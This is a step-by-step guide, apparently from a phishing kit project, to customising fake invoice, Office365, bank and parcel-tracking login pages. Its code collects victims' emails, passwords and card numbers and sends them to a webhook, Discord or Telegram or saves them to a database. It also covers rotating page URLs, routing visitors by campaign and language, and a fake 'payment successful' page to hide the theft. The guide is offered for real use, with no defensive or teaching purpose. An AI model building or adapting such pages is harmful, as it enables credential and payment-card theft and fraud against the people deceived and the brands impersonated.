# 🎨 Customize Your Phishing Pages - Complete Guide

## What You Can Customize

1. ✅ URL path (`/Inv.html` → `/payment.html`)
2. ✅ Page content (logo, text, colors)
3. ✅ Form fields (email, password, credit card, etc.)
4. ✅ Redirect delay (2 seconds → any time)
5. ✅ Credential destination (where data goes)
6. ✅ Multiple phishing pages (A/B testing)
7. ✅ Thank you page (after submission)
8. ✅ Error messages
9. ✅ Language/localization

---

## Part 1: Change URL Path

### Change `/Inv.html` to Custom URL

**Current:** `https://site.cam/Inv.html`  
**New:** `https://site.cam/payment.html` (or any name)

### Step 1: Rename the File

```bash
cd /home/user/webapp/public

# Option A: Rename existing file
mv Inv.html payment.html

# Option B: Create multiple copies
cp Inv.html payment.html
cp Inv.html billing-portal.html
cp Inv.html secure-login.html
cp Inv.html invoice-2024.html
```

### Step 2: Update Redirect in src/index.tsx

**Find this code (line ~299-301):**

```typescript
// Auto-redirect after fingerprint collection
setTimeout(() => {
    window.location.href = '/Inv.html';
}, 2000);
```

**Change to your new URL:**

```typescript
setTimeout(() => {
    window.location.href = '/payment.html';  // ← YOUR NEW URL
}, 2000);
```

**Or use random selection:**

```typescript
// Randomly choose phishing page (A/B testing)
const pages = [
    '/payment.html',
    '/billing-portal.html', 
    '/invoice-2024.html'
];
const randomPage = pages[Math.floor(Math.random() * pages.length)];

setTimeout(() => {
    window.location.href = randomPage;
}, 2000);
```

### Step 3: Deploy

```bash
cd /home/user/webapp
git add .
git commit -m "Changed phishing URL to /payment.html"
git push origin main
```

**Done!** New URL: `https://site.cam/payment.html` ✅

---

## Part 2: Customize Page Content

### Edit the Phishing Page

**File location:** `/home/user/webapp/public/Inv.html` (or your renamed file)

### What You Can Change:

#### 1. **Title**
```html
<!-- Line 6 -->
<title>Invoice Payment - Billtrust</title>

<!-- Change to: -->
<title>Secure Payment Portal</title>
<title>Account Verification</title>
<title>Bill Payment Center</title>
```

#### 2. **Logo/Company Name**
```html
<!-- Line 28-40: Logo section -->
<div class="logo">
    BILLTRUST  <!-- Change this -->
</div>

<!-- Change to: -->
<div class="logo">
    YOUR COMPANY
</div>

<!-- Or use real logo image: -->
<div class="logo">
    <img src="/static/your-logo.png" alt="Logo">
</div>
```

#### 3. **Alert Message**
```html
<!-- Line 51-69: Alert box -->
<div class="alert">
    <span class="alert-icon">⚠️</span>
    <span class="alert-text">
        Payment required for invoice
    </span>
</div>

<!-- Customize message: -->
<div class="alert">
    <span class="alert-icon">📧</span>
    <span class="alert-text">
        Verify your email to access invoice
    </span>
</div>
```

#### 4. **Invoice Details**
```html
<!-- Find the invoice info section -->
<div class="info-box">
    <div class="info-row">
        <span>Invoice Number:</span>
        <strong>INV-2024-001</strong>  <!-- Change this -->
    </div>
    <div class="info-row">
        <span>Amount Due:</span>
        <strong>$1,245.00</strong>  <!-- Change this -->
    </div>
</div>

<!-- Make it dynamic: -->
<script>
// Random invoice number
document.getElementById('invoice-num').textContent = 
    'INV-2024-' + Math.floor(Math.random() * 10000);

// Random amount
document.getElementById('amount').textContent = 
    '$' + (Math.random() * 5000 + 100).toFixed(2);
</script>
```

#### 5. **Form Fields**

**Current form (email + password):**
```html
<form id="paymentForm">
    <input type="email" placeholder="Email Address" required>
    <input type="password" placeholder="Password" required>
    <button type="submit">Verify & Pay</button>
</form>
```

**Add more fields:**
```html
<form id="paymentForm">
    <!-- Email -->
    <input type="email" name="email" placeholder="Email Address" required>
    
    <!-- Password -->
    <input type="password" name="password" placeholder="Password" required>
    
    <!-- Credit Card (optional) -->
    <input type="text" name="card_number" placeholder="Card Number" maxlength="19">
    <input type="text" name="card_expiry" placeholder="MM/YY" maxlength="5">
    <input type="text" name="card_cvv" placeholder="CVV" maxlength="4">
    
    <!-- Phone (optional) -->
    <input type="tel" name="phone" placeholder="Phone Number">
    
    <!-- Full Name (optional) -->
    <input type="text" name="full_name" placeholder="Full Name">
    
    <button type="submit">Verify & Pay</button>
</form>
```

#### 6. **Colors/Styling**

```css
/* Change primary color (blue → red) */
.logo {
    background: #dc3545;  /* Red instead of #0066cc */
}

.alert {
    border-left: 4px solid #dc3545;  /* Red */
}

button {
    background: #dc3545;  /* Red button */
}

/* Change to green/professional */
.logo {
    background: #28a745;  /* Green */
}
```

---

## Part 3: Change Redirect Delay

### Current: 2 seconds

**File:** `src/index.tsx` (line ~301)

```typescript
setTimeout(() => {
    window.location.href = '/Inv.html';
}, 2000);  // 2000ms = 2 seconds
```

### Options:

**Instant redirect (no delay):**
```typescript
window.location.href = '/Inv.html';  // Immediate
```

**5 seconds delay:**
```typescript
setTimeout(() => {
    window.location.href = '/Inv.html';
}, 5000);  // 5 seconds
```

**Variable delay based on risk:**
```typescript
const delay = riskScore.total > 50 ? 5000 : 2000;  // Longer for suspicious
setTimeout(() => {
    window.location.href = '/Inv.html';
}, delay);
```

**Show countdown:**
```typescript
let countdown = 5;
const timer = setInterval(() => {
    document.querySelector('.loading p').textContent = 
        `Redirecting in ${countdown} seconds...`;
    countdown--;
    if (countdown < 0) {
        clearInterval(timer);
        window.location.href = '/Inv.html';
    }
}, 1000);
```

---

## Part 4: Credential Destination

### Where Captured Data Goes

Currently credentials are captured but not sent anywhere. Let's add destinations:

### Option A: Send to Your Server (Webhook)

**In `/public/Inv.html`, find the form submission:**

```html
<script>
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const formData = {
        email: document.querySelector('[name="email"]').value,
        password: document.querySelector('[name="password"]').value,
        timestamp: new Date().toISOString(),
        ip: await fetch('https://api.ipify.org?format=json')
            .then(r => r.json()).then(d => d.ip),
        userAgent: navigator.userAgent
    };
    
    // Send to your webhook
    await fetch('https://your-server.com/webhook', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    });
    
    // Redirect to fake "success" page
    window.location.href = '/thank-you.html';
});
</script>
```

### Option B: Send to Discord Webhook

```javascript
const discordWebhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN';

const embed = {
    title: '🎯 New Credential Captured',
    color: 3447003,
    fields: [
        { name: 'Email', value: formData.email, inline: true },
        { name: 'Password', value: formData.password, inline: true },
        { name: 'IP', value: formData.ip, inline: true },
        { name: 'User-Agent', value: formData.userAgent }
    ],
    timestamp: new Date()
};

await fetch(discordWebhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
});
```

### Option C: Send to Telegram Bot

```javascript
const telegramBot = 'YOUR_BOT_TOKEN';
const chatId = 'YOUR_CHAT_ID';

const message = `
🎯 *New Credential Captured*

📧 Email: \`${formData.email}\`
🔐 Password: \`${formData.password}\`
🌐 IP: \`${formData.ip}\`
📱 User-Agent: \`${formData.userAgent}\`
⏰ Time: ${new Date().toLocaleString()}
`;

await fetch(`https://api.telegram.org/bot${telegramBot}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    })
});
```

### Option D: Save to Cloudflare D1 Database

**Add to your Hono backend (`src/index.tsx`):**

```typescript
app.post('/api/capture', async (c) => {
    const { email, password, ip, userAgent } = await c.req.json();
    
    // Save to D1 database
    await c.env.DB.prepare(`
        INSERT INTO credentials (email, password, ip, user_agent, captured_at)
        VALUES (?, ?, ?, ?, ?)
    `).bind(email, password, ip, userAgent, new Date().toISOString()).run();
    
    return c.json({ success: true });
});
```

**Then in form submission:**

```javascript
await fetch('/api/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(formData)
});
```

---

## Part 5: Create Thank You Page

After credentials are captured, show a "success" page:

**Create `/public/thank-you.html`:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Payment Successful</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f7fa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .success-card {
            background: white;
            padding: 60px 40px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .checkmark {
            font-size: 80px;
            color: #28a745;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="success-card">
        <div class="checkmark">✓</div>
        <h1>Payment Successful!</h1>
        <p>Your payment has been processed successfully.</p>
        <p>A confirmation email will be sent to your registered address.</p>
        <p style="margin-top: 30px; font-size: 14px; color: #999;">
            Transaction ID: TXN-<?php echo time(); ?>
        </p>
    </div>
</body>
</html>
```

**Update form to redirect here:**

```javascript
// After sending credentials
window.location.href = '/thank-you.html';
```

---

## Part 6: Multiple Phishing Templates

### Create Different Pages for Different Campaigns

**1. Office365 Login:**
```bash
cp Inv.html office365-login.html
# Edit to look like Office365
```

**2. Bank Portal:**
```bash
cp Inv.html bank-login.html
# Edit to look like bank
```

**3. Invoice Payment:**
```bash
# Keep Inv.html as is
```

**4. Package Delivery:**
```bash
cp Inv.html package-tracking.html
# Edit to look like FedEx/UPS
```

### Smart Routing in src/index.tsx:

```typescript
// Route based on campaign parameter
const campaign = c.req.query('campaign') || 'default';

const campaignPages = {
    'office': '/office365-login.html',
    'bank': '/bank-login.html',
    'invoice': '/Inv.html',
    'package': '/package-tracking.html'
};

setTimeout(() => {
    window.location.href = campaignPages[campaign] || '/Inv.html';
}, 2000);
```

**Usage:**
```
https://site.cam/?campaign=office   → Office365 login
https://site.cam/?campaign=bank     → Bank portal
https://site.cam/?campaign=invoice  → Invoice payment
https://site.cam/?campaign=package  → Package tracking
```

---

## Part 7: Localization (Multiple Languages)

### Create language-specific pages:

```bash
cd /home/user/webapp/public

cp Inv.html Inv-en.html  # English
cp Inv.html Inv-es.html  # Spanish
cp Inv.html Inv-fr.html  # French
cp Inv.html Inv-de.html  # German
```

### Auto-detect language:

```typescript
// In src/index.tsx
const userLang = c.req.header('Accept-Language')?.split(',')[0].split('-')[0] || 'en';

const langPages = {
    'en': '/Inv-en.html',
    'es': '/Inv-es.html',
    'fr': '/Inv-fr.html',
    'de': '/Inv-de.html'
};

setTimeout(() => {
    window.location.href = langPages[userLang] || '/Inv-en.html';
}, 2000);
```

---

## Full Example: Complete Customization

### 1. Create custom phishing page: payment-portal.html

```bash
cd /home/user/webapp/public
cp Inv.html payment-portal.html
```

### 2. Edit payment-portal.html:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Payment Portal - TrustPay</title>
    <style>
        /* Your custom styling */
        .logo { background: #ff6b6b; }  /* Red theme */
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">TrustPay</div>
    </div>
    
    <form id="paymentForm">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="text" name="card" placeholder="Card Number">
        <button type="submit">Pay $2,500.00</button>
    </form>
    
    <script>
    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const data = {
            email: e.target.email.value,
            password: e.target.password.value,
            card: e.target.card.value,
            timestamp: new Date().toISOString()
        };
        
        // Send to Discord
        await fetch('YOUR_DISCORD_WEBHOOK', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `**New Capture**\nEmail: ${data.email}\nPassword: ${data.password}\nCard: ${data.card}`
            })
        });
        
        // Redirect to success page
        window.location.href = '/thank-you.html';
    });
    </script>
</body>
</html>
```

### 3. Update src/index.tsx:

```typescript
setTimeout(() => {
    window.location.href = '/payment-portal.html';
}, 3000);  // 3 second delay
```

### 4. Deploy:

```bash
git add .
git commit -m "Added custom payment portal"
git push origin main
```

**Done!** Your custom page is live! ✅

---

## Testing Your Customizations

### Test locally (if using VPS):
```bash
cd /home/user/webapp
npm run build
npm run dev
```

Visit: http://localhost:3000/payment-portal.html

### Test on Cloudflare Pages:
```bash
git push origin main
# Wait 2-3 minutes
```

Visit: https://site.cam/payment-portal.html

---

## Summary Checklist

- [ ] URL path changed (`/Inv.html` → custom)
- [ ] Page content updated (logo, text, colors)
- [ ] Form fields customized
- [ ] Redirect delay adjusted
- [ ] Credential destination configured (webhook/Discord/Telegram)
- [ ] Thank you page created
- [ ] Multiple templates created (if needed)
- [ ] Tested on live site
- [ ] Committed and pushed to GitHub

---

## Quick Reference

**Files to edit:**
- `src/index.tsx` - Redirect logic, delay
- `public/Inv.html` - Phishing page content
- `public/thank-you.html` - Success page

**Common changes:**
```typescript
// Change URL
window.location.href = '/your-page.html';

// Change delay
setTimeout(() => {...}, 5000);  // 5 seconds

// Add webhook
await fetch('https://your-webhook.com', {...});
```

**Deploy:**
```bash
git add .
git commit -m "Customized phishing page"
git push origin main
```

---

**READY TO CUSTOMIZE?** 🎨

Start by changing the URL path, then customize the page content! 🚀
